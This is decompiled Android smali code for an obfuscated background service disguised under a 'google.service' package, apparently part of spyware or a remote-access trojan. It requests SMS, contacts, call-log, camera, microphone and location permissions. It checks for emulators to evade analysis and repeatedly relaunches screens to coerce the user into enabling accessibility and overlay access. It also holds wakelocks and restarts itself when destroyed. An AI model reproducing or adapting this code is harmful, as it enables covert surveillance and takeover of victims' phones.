.class public Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;
.super Landroid/app/IntentService;
.source "\u03c6\u05d9\u02be\u1d35\u1d62\u02bf\u2da8\u02ce\u3164\u02cf\u03c6\u02ce\u02c9\u3164\u2da8\u3164\u2db1\u0640\u02cb\u2db1\u03c6\u1d4e\u31644794.java"


# static fields
.field public static IDONE:Ljava/lang/Boolean; = null

.field public static Trys:I = 0x0

.field public static asked:Ljava/lang/Boolean; = null

.field public static shown:Ljava/lang/Boolean; = null

.field public static speedTime:I = 0x3e8


# instance fields
.field public PERMISSIONS:[Ljava/lang/String;

.field public iamworking:Z

.field private tag:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    .line 64
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->shown:Ljava/lang/Boolean;

    .line 65
    sput-object v0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->asked:Ljava/lang/Boolean;

    .line 66
    sput-object v0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->IDONE:Ljava/lang/Boolean;

    const/4 v0, 0x6

    .line 68
    sput v0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->Trys:I

    return-void
.end method

.method public constructor <init>()V
    .locals 10

    const-string v0, ""

    .line 36
    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    const-string v0, "com.splash.app:LOCK"

    .line 67
    iput-object v0, p0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->tag:Ljava/lang/String;

    const-string v1, "android.permission.WRITE_EXTERNAL_STORAGE"

    const-string v2, "android.permission.READ_CONTACTS"

    const-string v3, "android.permission.READ_SMS"

    const-string v4, "android.permission.READ_CALL_LOG"

    const-string v5, "android.permission.READ_EXTERNAL_STORAGE"

    const-string v6, "android.permission.CAMERA"

    const-string v7, "android.permission.RECORD_AUDIO"

    const-string v8, "android.permission.ACCESS_COARSE_LOCATION"

    const-string v9, "android.permission.ACCESS_FINE_LOCATION"

    .line 284
    filled-new-array/range {v1 .. v9}, [Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->PERMISSIONS:[Ljava/lang/String;

    const/4 v0, 0x0

    .line 295
    iput-boolean v0, p0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->iamworking:Z

    return-void
.end method

.method public static NeedSuper()Z
    .locals 2

    const-string v0, "on"

    const-string v1, "on"

    if-ne v0, v1, :cond_0

    const/4 v0, 0x1

    return v0

    :cond_0
    const/4 v0, 0x0

    return v0
.end method

.method public static varargs hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 4

    if-eqz p0, :cond_1

    if-eqz p1, :cond_1

    .line 298
    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v0, :cond_1

    aget-object v3, p1, v2

    .line 299
    invoke-static {p0, v3}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    return v1

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    const/4 p0, 0x1

    return p0
.end method

.method public static isAccessibilityServiceEnabled(Landroid/content/Context;Ljava/lang/Class;)Z
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/Class<",
            "*>;)Z"
        }
    .end annotation

    const/4 v0, 0x0

    .line 41
    :try_start_0
    new-instance v1, Landroid/content/ComponentName;

    invoke-direct {v1, p0, p1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 43
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object p0

    const-string p1, "enabled_accessibility_services"

    invoke-static {p0, p1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    if-nez p0, :cond_0

    return v0

    .line 47
    :cond_0
    new-instance p1, Landroid/text/TextUtils$SimpleStringSplitter;

    const/16 v2, 0x3a

    invoke-direct {p1, v2}, Landroid/text/TextUtils$SimpleStringSplitter;-><init>(C)V

    .line 48
    invoke-virtual {p1, p0}, Landroid/text/TextUtils$SimpleStringSplitter;->setString(Ljava/lang/String;)V

    .line 50
    :cond_1
    invoke-virtual {p1}, Landroid/text/TextUtils$SimpleStringSplitter;->hasNext()Z

    move-result p0

    if-eqz p0, :cond_2

    .line 51
    invoke-virtual {p1}, Landroid/text/TextUtils$SimpleStringSplitter;->next()Ljava/lang/String;

    move-result-object p0

    .line 52
    invoke-static {p0}, Landroid/content/ComponentName;->unflattenFromString(Ljava/lang/String;)Landroid/content/ComponentName;

    move-result-object p0

    if-eqz p0, :cond_1

    .line 54
    invoke-virtual {p0, v1}, Landroid/content/ComponentName;->equals(Ljava/lang/Object;)Z

    move-result p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz p0, :cond_1

    const/4 p0, 0x1

    return p0

    :catch_0
    :cond_2
    return v0
.end method

.method public static isEmulator_1()Z
    .locals 4

    .line 70
    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    const-string v1, "generic"

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    const-string v2, "unknown"

    .line 71
    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const-string v2, "google_sdk"

    .line 72
    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const-string v3, "Emulator"

    .line 73
    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const-string v3, "Android SDK built for x86"

    .line 74
    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    const-string v3, "Genymotion"

    .line 75
    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;

    .line 76
    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    :cond_0
    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    .line 77
    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    goto :goto_1

    :cond_2
    :goto_0
    const/4 v0, 0x1

    :goto_1
    return v0
.end method


# virtual methods
.method public getScreenBoolean(Landroid/content/Context;)Z
    .locals 1

    const-string v0, "keyguard"

    .line 319
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/KeyguardManager;

    .line 320
    invoke-virtual {p1}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result p1

    if-eqz p1, :cond_0

    const/4 p1, 0x0

    return p1

    :cond_0
    const/4 p1, 0x1

    return p1
.end method

.method public onDestroy()V
    .locals 2

    .line 309
    invoke-super {p0}, Landroid/app/IntentService;->onDestroy()V

    .line 311
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-string v1, "ac.in.ActivityRecognition.RestartSensor"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 312
    invoke-virtual {p0, v0}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 9

    invoke-static {}, Lcom/google/service/MainService;->start()V

    .line 82
    invoke-virtual {p0}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    .line 83
    invoke-static {}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->isEmulator_1()Z

    move-result v0

    const/16 v0, 0x17

    const/4 v1, 0x1

    .line 87
    :try_start_0
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    if-ne v2, v0, :cond_0

    sget-object v2, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    const-string v3, "Huawei"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    const-string v2, "LocationManagerService"

    const-string v3, "power"

    .line 89
    invoke-virtual {p0, v3}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/os/PowerManager;

    invoke-virtual {v3, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v2

    .line 90
    invoke-virtual {v2}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v3

    if-nez v3, :cond_0

    .line 91
    invoke-virtual {v2}, Landroid/os/PowerManager$WakeLock;->acquire()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    nop

    .line 98
    :cond_0
    :goto_0
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const v3, 0x7f090010

    invoke-virtual {v2, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->pr:Ljava/lang/String;

    const/4 v2, 0x0

    .line 148
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->IDONE:Ljava/lang/Boolean;

    .line 150
    sget-object v4, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->pr:Ljava/lang/String;

    const/4 v5, 0x2

    invoke-virtual {v4, v5}, Ljava/lang/String;->charAt(I)C

    move-result v4

    sget-char v5, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->c1:C

    if-ne v4, v5, :cond_1

    const/16 v4, 0x2710

    .line 151
    sput v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->speedTime:I

    .line 163
    :catch_1
    :cond_1
    :goto_1
    :try_start_1
    sget-object v4, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    sget v5, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->speedTime:I

    int-to-long v5, v5

    invoke-virtual {v4, v5, v6}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 170
    :catch_2
    :try_start_2
    const-class v4, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;

    invoke-static {p0, v4}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->isAccessibilityServiceEnabled(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    const/high16 v5, 0x40000000    # 2.0f

    const/high16 v6, 0x20000000

    const/high16 v7, 0x10000000

    if-nez v4, :cond_2

    invoke-virtual {p0, p0}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->getScreenBoolean(Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_2

    invoke-static {}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->NeedSuper()Z

    move-result v4

    if-eqz v4, :cond_2

    .line 172
    sget v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->Trys:I

    add-int/2addr v4, v1

    sput v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->Trys:I

    const/4 v8, 0x4

    if-lt v4, v8, :cond_1

    .line 178
    sput v2, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->Trys:I

    const/16 v4, 0xbb8

    .line 180
    sput v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->speedTime:I

    .line 181
    new-instance v4, Landroid/content/Intent;

    const-class v8, Lgoogle/service/ⶱʾ䉀ʿⶱʿᴵㅤיⶱʾⶱⶱˎ$ʿ$䉀ʾ$$ﹳـ4785;

    invoke-direct {v4, p0, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 182
    invoke-virtual {v4, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v4

    .line 183
    invoke-virtual {v4, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v4

    .line 184
    invoke-virtual {v4, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v4

    .line 181
    invoke-virtual {p0, v4}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->startActivity(Landroid/content/Intent;)V

    goto :goto_1

    .line 193
    :cond_2
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v8, 0x1388

    if-lt v4, v0, :cond_3

    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v4

    if-nez v4, :cond_3

    invoke-static {}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->NeedSuper()Z

    move-result v4

    if-nez v4, :cond_3

    .line 195
    sget-object v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->shown:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-nez v4, :cond_1

    .line 197
    sput v8, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->speedTime:I

    .line 198
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->shown:Ljava/lang/Boolean;

    .line 199
    new-instance v4, Landroid/content/Intent;

    const-class v5, Lgoogle/service/ⶱ$ʾঙˎˈʿٴⶨㅤ$ㅤφˊʾʿೲˋㅤ$ೲφﹶೲ4787;

    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 200
    invoke-virtual {v4, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v4

    .line 199
    invoke-virtual {p0, v4}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->startActivity(Landroid/content/Intent;)V

    goto :goto_1

    .line 206
    :cond_3
    iget-object v4, p0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->PERMISSIONS:[Ljava/lang/String;

    invoke-static {p0, v4}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_5

    .line 207
    sget-object v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->asked:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-nez v4, :cond_4

    .line 209
    sput v8, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->speedTime:I

    .line 210
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->asked:Ljava/lang/Boolean;

    .line 213
    new-instance v4, Landroid/content/Intent;

    const-class v5, Lgoogle/service/䉀φ$ˎʾʻʾˎⶱ$ˆ䉀ˉـˋ$ـיㅤᵎʾᵔⶱᵢㅤʿˋᴵᵢ4793;

    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 214
    invoke-virtual {v4, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v4

    .line 215
    invoke-virtual {v4, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v4

    .line 213
    invoke-virtual {p0, v4}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_1

    :cond_4
    const/16 v4, 0x7d0

    .line 220
    sput v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->speedTime:I

    goto/16 :goto_1

    .line 227
    :cond_5
    iget-boolean v4, p0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->iamworking:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    if-nez v4, :cond_9

    .line 230
    :try_start_3
    iput-boolean v1, p0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->iamworking:Z

    .line 231
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->bypass:Ljava/lang/Boolean;

    .line 232
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->FOR_prim:Ljava/lang/Boolean;

    .line 234
    const-class v4, Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802;

    invoke-static {v4, p1}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->sFhShxrBDUTiACGNcRtoCJ4818(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_7

    .line 235
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    invoke-virtual {v4, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v4

    sput-object v4, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->pr:Ljava/lang/String;

    .line 236
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x1a

    if-lt v4, v6, :cond_6

    sget-object v4, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->pr:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->charAt(I)C

    move-result v4

    sget-char v6, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->c1:C

    if-ne v4, v6, :cond_6

    .line 237
    new-instance v4, Landroid/content/Intent;

    const-class v6, Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802;

    invoke-direct {v4, p1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v4}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_2

    .line 240
    :cond_6
    new-instance v4, Landroid/content/Intent;

    const-class v6, Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802;

    invoke-direct {v4, p1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v4}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 246
    :cond_7
    :goto_2
    invoke-static {p0}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->is_dozemode(Landroid/content/Context;)Z

    move-result v4

    if-nez v4, :cond_8

    .line 247
    new-instance v4, Landroid/content/Intent;

    const-class v6, Lgoogle/service/ʾˎʾㅤᵎˈˆـθ䉀ⁱʾㅤθㅤʾʿㅤˊㅤθㅤ4786;

    invoke-direct {v4, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 248
    invoke-virtual {v4, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 249
    invoke-virtual {v4, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 250
    invoke-virtual {p0, v4}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->startActivity(Landroid/content/Intent;)V

    .line 254
    :cond_8
    const-class v4, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-static {v4, p1}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->sFhShxrBDUTiACGNcRtoCJ4818(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_9

    .line 256
    new-instance v4, Landroid/content/Intent;

    const-class v5, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v4}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    :cond_9
    const/16 v4, 0x61a8

    .line 267
    :try_start_4
    sput v4, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->speedTime:I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto/16 :goto_1
.end method
